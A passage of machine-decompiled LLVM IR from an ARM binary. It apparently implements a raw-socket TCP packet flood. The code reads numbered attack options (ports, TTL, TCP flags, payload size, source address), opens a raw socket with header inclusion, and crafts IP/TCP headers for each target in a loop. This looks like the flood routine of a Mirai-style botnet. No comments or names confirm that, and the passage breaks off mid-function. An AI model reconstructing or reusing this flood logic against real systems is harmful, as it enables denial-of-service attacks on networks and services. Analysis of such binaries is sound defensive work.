  %v4_c26c = inttoptr i32 %v0_c258 to i32*
  %v5_c26c = call i32 @function_85e0(i32 %v0_c268, i32* %v4_c26c, i32 4, i32 64)
  %v1_c274 = urem i32 %v5_c26c, 256
  store i32 %v1_c274, i32* %ip.global-to-local, align 4
  %v0_c278 = load i32, i32* @r5, align 4
  store i32 %v0_c278, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c284 = load i32, i32* @r4, align 4
  %v6_c28c = inttoptr i32 %v0_c278 to i32*
  %v7_c28c = call i32 @function_85e0(i32 %v0_c284, i32* %v6_c28c, i32 5, i32 0)
  %v1_c298 = urem i32 %v7_c28c, 256
  store i32 %v1_c298, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c2a4 = load i32, i32* @r5, align 4
  store i32 %v0_c2a4, i32* %r1.global-to-local, align 4
  %v0_c2a8 = load i32, i32* @r4, align 4
  %v5_c2b0 = inttoptr i32 %v0_c2a4 to i32*
  %v6_c2b0 = call i32 @function_85e0(i32 %v0_c2a8, i32* %v5_c2b0, i32 6, i32 65535)
  %v0_c2b8 = load i32, i32* @r5, align 4
  store i32 %v0_c2b8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c2b0, i32* @r7, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  %v4_c2cc = inttoptr i32 %v0_c2b8 to i32*
  %v5_c2cc = call i32 @function_85e0(i32 %v0_c2c8, i32* %v4_c2cc, i32 7, i32 65535)
  %v0_c2d4 = load i32, i32* @r5, align 4
  store i32 %v0_c2d4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c2cc, i32* @r6, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2d4 to i32*
  %v5_c2e8 = call i32 @function_85e0(i32 %v0_c2e4, i32* %v4_c2e8, i32 17, i32 65535)
  %v0_c2f4 = load i32, i32* @r5, align 4
  store i32 %v0_c2f4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_c300 = load i32, i32* @r4, align 4
  %v5_c304 = inttoptr i32 %v0_c2f4 to i32*
  %v6_c304 = call i32 @function_85e0(i32 %v0_c300, i32* %v5_c304, i32 18, i32 65535)
  %v0_c308 = load i32, i32* @r5, align 4
  store i32 %v0_c308, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v5_c31c = inttoptr i32 %v0_c308 to i32*
  %v6_c31c = call i32 @function_85e0(i32 %v0_c318, i32* %v5_c31c, i32 11, i32 0)
  %v0_c320 = load i32, i32* @r5, align 4
  store i32 %v0_c320, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c330 = load i32, i32* @r4, align 4
  %v5_c334 = inttoptr i32 %v0_c320 to i32*
  %v6_c334 = call i32 @function_85e0(i32 %v0_c330, i32* %v5_c334, i32 12, i32 1)
  %v0_c338 = load i32, i32* @r5, align 4
  store i32 %v0_c338, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c348 = load i32, i32* @r4, align 4
  %v5_c34c = inttoptr i32 %v0_c338 to i32*
  %v6_c34c = call i32 @function_85e0(i32 %v0_c348, i32* %v5_c34c, i32 13, i32 0)
  %v0_c350 = load i32, i32* @r5, align 4
  store i32 %v0_c350, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c360 = load i32, i32* @r4, align 4
  %v5_c364 = inttoptr i32 %v0_c350 to i32*
  %v6_c364 = call i32 @function_85e0(i32 %v0_c360, i32* %v5_c364, i32 14, i32 0)
  %v0_c368 = load i32, i32* @r5, align 4
  store i32 %v0_c368, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c378 = load i32, i32* @r4, align 4
  %v5_c37c = inttoptr i32 %v0_c368 to i32*
  %v6_c37c = call i32 @function_85e0(i32 %v0_c378, i32* %v5_c37c, i32 15, i32 0)
  %v0_c380 = load i32, i32* @r5, align 4
  store i32 %v0_c380, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c390 = load i32, i32* @r4, align 4
  %v5_c394 = inttoptr i32 %v0_c380 to i32*
  %v6_c394 = call i32 @function_85e0(i32 %v0_c390, i32* %v5_c394, i32 16, i32 0)
  %v0_c398 = load i32, i32* @r5, align 4
  store i32 %v0_c398, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_c3a8 = load i32, i32* @r4, align 4
  %v5_c3ac = inttoptr i32 %v0_c398 to i32*
  %v6_c3ac = call i32 @function_85e0(i32 %v0_c3a8, i32* %v5_c3ac, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c3bc = load i32, i32* @r5, align 4
  store i32 %v0_c3bc, i32* %r1.global-to-local, align 4
  %v0_c3c0 = load i32, i32* @r4, align 4
  %v4_c3c4 = inttoptr i32 %v0_c3bc to i32*
  %v5_c3c4 = call i32 @function_85e0(i32 %v0_c3c0, i32* %v4_c3c4, i32 1, i32 1)
  %v2_c3d0 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_c3d0, i32* %r3.global-to-local, align 4
  %v1_c3d4 = urem i32 %v5_c3c4, 256
  store i32 %v1_c3d4, i32* %ip.global-to-local, align 4
  %v0_c3d8 = load i32, i32* @r5, align 4
  store i32 %v0_c3d8, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c3e0 = load i32, i32* @r4, align 4
  %v5_c3e8 = inttoptr i32 %v0_c3d8 to i32*
  %v6_c3e8 = call i32 @function_8574(i32 %v0_c3e0, i32* %v5_c3e8, i32 25, i32 %v2_c3d0, i32 %v1_c3d4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c3fc = call i32 @function_123e0(i32 2, i32 3, i32 6)
  %v7_c400 = icmp eq i32 %v3_c3fc, -1
  store i1 %v7_c400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c400, label %dec_label_pc_c838, label %dec_label_pc_c40c

dec_label_pc_c40c:                                ; preds = %dec_label_pc_c1f8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c414 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c414, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c428 = call i32 @function_123b0(i32 %v3_c3fc, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v7_c42c = icmp eq i32 %v6_c428, -1
  store i1 %v7_c42c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c42c, label %dec_label_pc_c830, label %dec_label_pc_c434

dec_label_pc_c434:                                ; preds = %dec_label_pc_c40c
  %v0_c434 = load i32, i32* @r8, align 4
  %v0_c438 = load i32, i32* @r7, align 4
  %v0_c43c = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c444 = urem i32 %v0_c434, 65536
  store i32 %v3_c444, i32* %r2.global-to-local, align 4
  %v3_c448 = urem i32 %v0_c438, 65536
  store i32 %v3_c448, i32* %r3.global-to-local, align 4
  %v3_c44c = urem i32 %v0_c43c, 65536
  store i32 %v3_c44c, i32* %ip.global-to-local, align 4
  %v0_c450 = load i32, i32* @fp, align 4
  %v2_c450 = icmp eq i32 %v0_c450, 0
  store i1 %v2_c450, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp75 = icmp slt i32 %v0_c450, 1
  br i1 %tmp75, label %dec_label_pc_c950, label %dec_label_pc_c468

dec_label_pc_c468:                                ; preds = %dec_label_pc_c434
  %v1_c470 = add i32 %v6_c3ac, 40
  %tmp76 = mul i32 %v1_c470, 256
  %v1_c484 = urem i32 %v0_c438, 256
  %v1_c488 = and i32 %tmp76, 65280
  %v3_c48c = mul nuw nsw i32 %v1_c484, 256
  %v1_c494 = urem i32 %v0_c43c, 256
  %tmp77 = udiv i32 %v0_c43c, 256
  %v3_c498 = urem i32 %tmp77, 256
  %tmp78 = udiv i32 %v1_c470, 256
  %v4_c49c = urem i32 %tmp78, 256
  %v5_c49c = or i32 %v4_c49c, %v1_c488
  store i32 %v5_c49c, i32* @lr, align 4
  %tmp79 = udiv i32 %v0_c438, 256
  %v4_c4a0 = urem i32 %tmp79, 256
  %v5_c4a0 = or i32 %v4_c4a0, %v3_c48c
  store i32 %v5_c4a0, i32* @sl, align 4
  %v4_c4a4 = mul nuw nsw i32 %v1_c494, 256
  %v5_c4a4 = or i32 %v4_c4a4, %v3_c498
  store i32 %v5_c4a4, i32* @r6, align 4
  %tmp80 = udiv i32 %v0_c434, 256
  %v3_c4b4 = urem i32 %tmp80, 256
  %v1_c4b8 = urem i32 %v0_c434, 256
  %tmp81 = mul i32 %v5_c2e8, 256
  %v1_c4c0 = and i32 %tmp81, 65280
  %v1_c4c4 = urem i32 %v6_c31c, 2
  %v1_c4c8 = urem i32 %v6_c334, 2
  %v1_c4cc = urem i32 %v6_c34c, 2
  %tmp82 = udiv i32 %v5_c2e8, 256
  %v4_c4d0 = urem i32 %tmp82, 256
  %v5_c4d0 = or i32 %v4_c4d0, %v1_c4c0
  store i32 %v5_c4d0, i32* @r8, align 4
  %v1_c4f0 = urem i32 %v6_c364, 2
  %v1_c4f4 = urem i32 %v6_c37c, 2
  %v1_c4f8 = urem i32 %v6_c394, 2
  %v1_c4fc = urem i32 %v6_c34c, 256
  %v4_c500 = mul nuw nsw i32 %v1_c4b8, 256
  %v5_c500 = or i32 %v4_c500, %v3_c4b4
  store i32 %v5_c500, i32* @r5, align 4
  %v3_c51425 = udiv i32 %v1_c488, 256
  store i32 %v3_c51425, i32* %r3.global-to-local, align 4
  store i32 %v1_c4b8, i32* %ip.global-to-local, align 4
  store i32 %v1_c484, i32* %r1.global-to-local, align 4
  store i32 %v1_c494, i32* %r2.global-to-local, align 4
  %v5_c530 = trunc i32 %v0_c438 to i8
  store i32 0, i32* @r4, align 4
  %sext8 = mul i32 %v5_c26c, 16777216
  %v4_c58c = sdiv i32 %sext8, 16777216
  %sext9 = mul i32 %v0_c434, 16777216
  %v4_c598 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %tmp78, 16777216
  %v4_c5ac = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %v1_c470, 16777216
  %v4_c5b0 = sdiv i32 %sext11, 16777216
  %tmp = sub nsw i32 0, %v1_c4c4
  %v4_c600 = and i32 %tmp, 32
  %tmp93 = sub nsw i32 0, %v1_c4c8
  %v4_c614 = and i32 %tmp93, 16
  %tmp94 = sub nsw i32 0, %v1_c4cc
  %v4_c628 = and i32 %tmp94, 8
  %tmp95 = sub nsw i32 0, %v1_c4f0
  %v4_c63c = and i32 %tmp95, 4
  %tmp96 = sub nsw i32 0, %v1_c4f4
  %v3_c650 = and i32 %tmp96, 2
  %sext12 = mul i32 %v0_c43c, 16777216
  %v7_c680 = sdiv i32 %sext12, 16777216
  %v1_c594 = trunc i32 %v4_c58c to i8
  %extract.t = trunc i32 %v4_c598 to i8
  %v3_c680 = sext i8 %v5_c530 to i32
  %v2_c6a4 = icmp eq i32 %v1_c4fc, 0
  br label %dec_label_pc_c53c

dec_label_pc_c53c:                                ; preds = %bb89, %dec_label_pc_c468
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c548 = call i32 @function_126cc(i32 1510, i32 1)
  store i32 %v2_c218, i32* %ip.global-to-local, align 4
  %v2_c554 = load i32, i32* @r4, align 4
  %v5_c554 = mul i32 %v2_c554, 4
  %v6_c554 = add i32 %v5_c554, %v2_c218
  %v7_c554 = inttoptr i32 %v6_c554 to i32*
  store i32 %v2_c548, i32* %v7_c554, align 4
  %v3_c558 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c558, i32* %r3.global-to-local, align 4
  %v0_c55c = load i32, i32* %ip.global-to-local, align 4
  %v4_c55c = mul i32 %v3_c558, 4
  %v5_c55c = add i32 %v0_c55c, %v4_c55c
  %v6_c55c = inttoptr i32 %v5_c55c to i32*
  %v7_c55c = load i32, i32* %v6_c55c, align 4
  store i32 %v7_c55c, i32* @r7, align 4
  %v1_c560 = inttoptr i32 %v7_c55c to i8*
  %v2_c560 = load i8, i8* %v1_c560, align 1
  %tmp97 = urem i8 %v2_c560, 16
  %v1_c564 = zext i8 %tmp97 to i32
  %v1_c568 = or i32 %v1_c564, 64
  store i32 %v1_c568, i32* %r2.global-to-local, align 4
  %v1_c56c = trunc i32 %v1_c568 to i8
  store i8 %v1_c56c, i8* %v1_c560, align 1
  %v0_c570 = load i32, i32* @r7, align 4
  %v1_c570 = inttoptr i32 %v0_c570 to i8*
  %v2_c570 = load i8, i8* %v1_c570, align 1
  %v1_c574 = and i8 %v2_c570, -16
  %v1_c578 = or i8 %v1_c574, 5
  store i32 %v1_c298, i32* %r1.global-to-local, align 4
  store i8 %v1_c578, i8* %v1_c570, align 1
  %v2_c588 = load i32, i32* @r7, align 4
  %v3_c588 = add i32 %v2_c588, 1
  %v4_c588 = inttoptr i32 %v3_c588 to i8*
  store i8 %v5_c250, i8* %v4_c588, align 1
  store i32 %v4_c58c, i32* %r3.global-to-local, align 4
  %v0_c590 = load i32, i32* %r1.global-to-local, align 4
  %v2_c590 = icmp eq i32 %v0_c590, 0
  store i1 %v2_c590, i1* %cpsr_z.global-to-local, align 1
  %v2_c594 = load i32, i32* @r7, align 4
  %v3_c594 = add i32 %v2_c594, 8
  %v4_c594 = inttoptr i32 %v3_c594 to i8*
  store i8 %v1_c594, i8* %v4_c594, align 1
  store i32 %v4_c598, i32* %r2.global-to-local, align 4
  %v0_c59c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c59c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c53c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5a0 = load i32, i32* @r7, align 4
  %v4_c5a0 = add i32 %v3_c5a0, 6
  %v5_c5a0 = inttoptr i32 %v4_c5a0 to i8*
  store i8 64, i8* %v5_c5a0, align 1
  %v0_c5a8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t26 = trunc i32 %v0_c5a8.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c53c, %bb
  %v0_c5a8.off0 = phi i8 [ %extract.t, %dec_label_pc_c53c ], [ %extract.t26, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_c5a8 = load i32, i32* @r7, align 4
  %v3_c5a8 = add i32 %v2_c5a8, 5
  %v4_c5a8 = inttoptr i32 %v3_c5a8 to i8*
  store i8 %v0_c5a8.off0, i8* %v4_c5a8, align 1
  store i32 %v4_c5ac, i32* %ip.global-to-local, align 4
  store i32 %v4_c5b0, i32* %r1.global-to-local, align 4
  %v0_c5b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5b4, label %bb84, label %bb83

bb83:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %.thread, %bb83
  %v0_c5b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5b8 = trunc i32 %v0_c5b8 to i8
  %v2_c5b8 = load i32, i32* @r7, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 9
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  %v0_c5bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5bc, label %bb86, label %bb85

bb85:                                             ; preds = %bb84
  %v1_c5bc = load i32, i32* %r2.global-to-local, align 4
  %v2_c5bc = trunc i32 %v1_c5bc to i8
  %v3_c5bc = load i32, i32* @r7, align 4
  %v4_c5bc = add i32 %v3_c5bc, 7
  %v5_c5bc = inttoptr i32 %v4_c5bc to i8*
  store i8 %v2_c5bc, i8* %v5_c5bc, align 1
  br label %bb86

bb86:                                             ; preds = %bb84, %bb85
  %v3_c5c0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c5c0, i32* %r2.global-to-local, align 4
  %v0_c5c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_c5c4 = trunc i32 %v0_c5c4 to i8
  %v2_c5c4 = load i32, i32* @r7, align 4
  %v3_c5c4 = add i32 %v2_c5c4, 2
  %v4_c5c4 = inttoptr i32 %v3_c5c4 to i8*
  store i8 %v1_c5c4, i8* %v4_c5c4, align 1
  store i32 %v6_c3e8, i32* %ip.global-to-local, align 4
  %v0_c5cc = load i32, i32* %r2.global-to-local, align 4
  %v3_c5cc = mul i32 %v0_c5cc, 32
  store i32 %v3_c5cc, i32* %r3.global-to-local, align 4
  %v1_c5d0 = load i32, i32* @r7, align 4
  %v2_c5d0 = add i32 %v1_c5d0, 12
  %v3_c5d0 = inttoptr i32 %v2_c5d0 to i32*
  store i32 %v6_c3e8, i32* %v3_c5d0, align 4
  %v0_c5d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d4 = load i32, i32* %r2.global-to-local, align 4
  %tmp98 = mul i32 %v1_c5d4, -8
  %v5_c5d4 = add i32 %v0_c5d4, %tmp98
  %v1_c5d8 = load i32, i32* @sb, align 4
  %v2_c5d8 = add i32 %v1_c5d8, %v5_c5d4
  store i32 %v2_c5d8, i32* %r3.global-to-local, align 4
  %v1_c5dc = add i32 %v2_c5d8, 16
  %v2_c5dc = inttoptr i32 %v1_c5dc to i32*
  %v3_c5dc = load i32, i32* %v2_c5dc, align 4
  store i32 %v3_c5dc, i32* %r2.global-to-local, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5e0 = trunc i32 %v0_c5e0 to i8
  %v2_c5e0 = load i32, i32* @r7, align 4
  %v3_c5e0 = add i32 %v2_c5e0, 3
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i8*
  store i8 %v1_c5e0, i8* %v4_c5e0, align 1
  %v0_c5e4 = load i32, i32* @r5, align 4
  %v1_c5e4 = trunc i32 %v0_c5e4 to i8
  %v2_c5e4 = load i32, i32* @r7, align 4
  %v3_c5e4 = add i32 %v2_c5e4, 4
  %v4_c5e4 = inttoptr i32 %v3_c5e4 to i8*
  store i8 %v1_c5e4, i8* %v4_c5e4, align 1
  %v0_c5e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5e8 = load i32, i32* @r7, align 4
  %v2_c5e8 = add i32 %v1_c5e8, 16
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v0_c5e8, i32* %v3_c5e8, align 4
  %v0_c5ec = load i32, i32* @sl, align 4
  %v1_c5ec = trunc i32 %v0_c5ec to i8
  %v2_c5ec = load i32, i32* @r7, align 4
  %v3_c5ec = add i32 %v2_c5ec, 20
  %v4_c5ec = inttoptr i32 %v3_c5ec to i8*
  store i8 %v1_c5ec, i8* %v4_c5ec, align 1
  %v0_c5f0 = load i32, i32* @r7, align 4
  %v1_c5f0 = add i32 %v0_c5f0, 20
  store i32 %v1_c5f0, i32* @r4, align 4
  %v1_c5f4 = add i32 %v0_c5f0, 33
  %v2_c5f4 = inttoptr i32 %v1_c5f4 to i8*
  %v3_c5f4 = load i8, i8* %v2_c5f4, align 1
  %v4_c5f4 = zext i8 %v3_c5f4 to i32
  store i32 %v1_c4c4, i32* %r1.global-to-local, align 4
  %v1_c5fc = and i32 %v4_c5f4, 223
  %v5_c600 = or i32 %v1_c5fc, %v4_c600
  store i32 %v5_c600, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v5_c600 to i8
  store i8 %v1_c604, i8* %v2_c5f4, align 1
  %v0_c608 = load i32, i32* @r4, align 4
  %v1_c608 = add i32 %v0_c608, 13
  %v2_c608 = inttoptr i32 %v1_c608 to i8*
  %v3_c608 = load i8, i8* %v2_c608, align 1
  %v4_c608 = zext i8 %v3_c608 to i32
  store i32 %v1_c4c8, i32* %r3.global-to-local, align 4
  %v1_c610 = and i32 %v4_c608, 239
  %v5_c614 = or i32 %v1_c610, %v4_c614
  store i32 %v5_c614, i32* %r2.global-to-local, align 4
  %v1_c618 = trunc i32 %v5_c614 to i8
  store i8 %v1_c618, i8* %v2_c608, align 1
  %v0_c61c = load i32, i32* @r4, align 4
  %v1_c61c = add i32 %v0_c61c, 13
  %v2_c61c = inttoptr i32 %v1_c61c to i8*
  %v3_c61c = load i8, i8* %v2_c61c, align 1
  %v4_c61c = zext i8 %v3_c61c to i32
  store i32 %v1_c4cc, i32* %ip.global-to-local, align 4
  %v1_c624 = and i32 %v4_c61c, 247
  %v5_c628 = or i32 %v1_c624, %v4_c628
  store i32 %v5_c628, i32* %r3.global-to-local, align 4
  %v1_c62c = trunc i32 %v5_c628 to i8
  store i8 %v1_c62c, i8* %v2_c61c, align 1
  %v0_c630 = load i32, i32* @r4, align 4
  %v1_c630 = add i32 %v0_c630, 13
  %v2_c630 = inttoptr i32 %v1_c630 to i8*
  %v3_c630 = load i8, i8* %v2_c630, align 1
  %v4_c630 = zext i8 %v3_c630 to i32
  store i32 %v1_c4f0, i32* %r1.global-to-local, align 4
  %v1_c638 = and i32 %v4_c630, 251
  %v5_c63c = or i32 %v1_c638, %v4_c63c
  store i32 %v5_c63c, i32* %r2.global-to-local, align 4
  %v1_c640 = trunc i32 %v5_c63c to i8
  store i8 %v1_c640, i8* %v2_c630, align 1
  %v0_c644 = load i32, i32* @r4, align 4
  %v1_c644 = add i32 %v0_c644, 13
  %v2_c644 = inttoptr i32 %v1_c644 to i8*
  %v3_c644 = load i8, i8* %v2_c644, align 1
  %v4_c644 = zext i8 %v3_c644 to i32
  store i32 %v1_c4f4, i32* %r2.global-to-local, align 4
  %v1_c64c = and i32 %v4_c644, 253
  %v4_c650 = or i32 %v1_c64c, %v3_c650
  store i32 %v4_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = trunc i32 %v4_c650 to i8
  store i8 %v1_c654, i8* %v2_c644, align 1
  %v0_c658 = load i32, i32* @r4, align 4
  %v1_c658 = add i32 %v0_c658, 12
  %v2_c658 = inttoptr i32 %v1_c658 to i8*
  %v3_c658 = load i8, i8* %v2_c658, align 1
  %v4_c658 = zext i8 %v3_c658 to i32
  store i32 %v4_c658, i32* %r2.global-to-local, align 4
  %v1_c65c = add i32 %v0_c658, 13
  %v2_c65c = inttoptr i32 %v1_c65c to i8*
  %v3_c65c = load i8, i8* %v2_c65c, align 1
  %v4_c65c = zext i8 %v3_c65c to i32
  store i32 %v1_c4f8, i32* %ip.global-to-local, align 4
  %tmp99 = urem i8 %v3_c658, 16
  %v1_c664 = zext i8 %tmp99 to i32
  %v1_c668 = and i32 %v4_c65c, 254
  %v2_c66c = or i32 %v1_c668, %v1_c4f8
  store i32 %v2_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = or i32 %v1_c664, 80
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = trunc i32 %v2_c66c to i8
  store i8 %v1_c674, i8* %v2_c65c, align 1
  %v0_c678 = load i32, i32* %r2.global-to-local, align 4
  %v1_c678 = trunc i32 %v0_c678 to i8
  %v2_c678 = load i32, i32* @r4, align 4
  %v3_c678 = add i32 %v2_c678, 12
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v1_c678, i8* %v4_c678, align 1
  store i32 %v3_c680, i32* %r1.global-to-local, align 4
  store i32 %v7_c680, i32* %r2.global-to-local, align 4
  %v2_c684 = load i32, i32* @r4, align 4
  %v3_c684 = add i32 %v2_c684, 1
  %v4_c684 = inttoptr i32 %v3_c684 to i8*
  store i8 %v5_c530, i8* %v4_c684, align 1
  %v0_c688 = load i32, i32* %r2.global-to-local, align 4
  %v1_c688 = trunc i32 %v0_c688 to i8
  %v2_c688 = load i32, i32* @r4, align 4
  %v3_c688 = add i32 %v2_c688, 3
  %v4_c688 = inttoptr i32 %v3_c688 to i8*
  store i8 %v1_c688, i8* %v4_c688, align 1
  %v0_c68c = load i32, i32* @r6, align 4
  %v1_c68c = trunc i32 %v0_c68c to i8
  %v2_c68c = load i32, i32* @r4, align 4
  %v3_c68c = add i32 %v2_c68c, 2
  %v4_c68c = inttoptr i32 %v3_c68c to i8*
  store i8 %v1_c68c, i8* %v4_c68c, align 1
  %v0_c690 = load i32, i32* @r8, align 4
  %v1_c690 = load i32, i32* @r4, align 4
  %v2_c690 = add i32 %v1_c690, 4
  %v3_c690 = inttoptr i32 %v2_c690 to i32*
  store i32 %v0_c690, i32* %v3_c690, align 4
  %v0_c694 = call i32 @function_e978()
  store i32 %v1_c4fc, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_c694, 16777216
  %v1_c69c = sdiv i32 %sext, 16777216
  store i32 %v1_c69c, i32* %r2.global-to-local, align 4
  %v3_c6a0 = ashr i32 %sext, 31
  store i32 %v3_c6a0, i32* %r3.global-to-local, align 4
  store i1 %v2_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v1_c6a8 = trunc i32 %v3_c6a0 to i8
  %v2_c6a8 = load i32, i32* @r4, align 4
  %v3_c6a8 = add i32 %v2_c6a8, 15
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i8*
  store i8 %v1_c6a8, i8* %v4_c6a8, align 1
  %v0_c6ac = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_c6b8.pre = load i32, i32* @r4, align 4
  br i1 %v0_c6ac, label %.thread13, label %bb87

bb87:                                             ; preds = %bb86
  %v2_c6ac = add i32 %v2_c6b8.pre, 13
  %v3_c6ac = inttoptr i32 %v2_c6ac to i8*
  %v4_c6ac = load i8, i8* %v3_c6ac, align 1
  %v5_c6ac = zext i8 %v4_c6ac to i32
  %v2_c6b0 = or i32 %v5_c6ac, 8
  store i32 %v2_c6b0, i32* %r3.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb86, %bb87
  store i32 %v6_c3ac, i32* @r1, align 4
  %v0_c6b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6b8 = trunc i32 %v0_c6b8 to i8
  %v3_c6b8 = add i32 %v2_c6b8.pre, 14
  %v4_c6b8 = inttoptr i32 %v3_c6b8 to i8*
  store i8 %v1_c6b8, i8* %v4_c6b8, align 1
  %v0_c6bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6bc, label %bb89, label %bb88

bb88:                                             ; preds = %.thread13
  %v1_c6bc = load i32, i32* %r3.global-to-local, align 4
  %v2_c6bc = trunc i32 %v1_c6bc to i8
  %v3_c6bc = load i32, i32* @r4, align 4
  %v4_c6bc = add i32 %v3_c6bc, 13
  %v5_c6bc = inttoptr i32 %v4_c6bc to i8*
  store i8 %v2_c6bc, i8* %v5_c6bc, align 1
  br label %bb89

bb89:                                             ; preds = %.thread13, %bb88
  %v0_c6c0 = load i32, i32* @r7, align 4
  %v1_c6c0 = add i32 %v0_c6c0, 40
  %v1_c6c4 = inttoptr i32 %v1_c6c0 to i8*
  %v2_c6c4 = call i32 @function_eaf8(i8* %v1_c6c4)
  %v3_c6c8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c6c8, i32* %r3.global-to-local, align 4
  %v1_c6cc = add i32 %v3_c6c8, 1
  store i32 %v1_c6cc, i32* @r4, align 4
  %v0_c6d0 = load i32, i32* @fp, align 4
  %v9_c6d0 = icmp eq i32 %v0_c6d0, %v1_c6cc
  store i1 %v9_c6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c6cc, i32* %stack_var_-40, align 4
  %v8_c6d8 = icmp sgt i32 %v0_c6d0, %v1_c6cc
  br i1 %v8_c6d8, label %dec_label_pc_c53c, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %bb89
  store i32 %v6_c3ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c6e4.preheader

dec_label_pc_c6e4.preheader:                      ; preds = %dec_label_pc_c6dc, %dec_label_pc_c950
  %v0_c6e417 = phi i32 [ %v0_c6d0, %dec_label_pc_c6dc ], [ %v0_c450, %dec_label_pc_c950 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_c470, %dec_label_pc_c6dc ], [ %v1_c958, %dec_label_pc_c950 ]
  %storemerge = add i32 %v6_c3ac, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_c89c = icmp eq i32 %v6_c3e8, -1
  %v8_c89c = icmp eq i32 %v6_c3e8, -1
  %v3_c8b8 = icmp eq i32 %v3_c444, 65535
  %v2_c934 = icmp eq i32 %v1_c3d4, 0
  br label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c78c, %dec_label_pc_c6e4.preheader
  %v0_c6e4 = phi i32 [ %v0_c6e417, %dec_label_pc_c6e4.preheader ], [ %v0_c820, %dec_label_pc_c78c ]
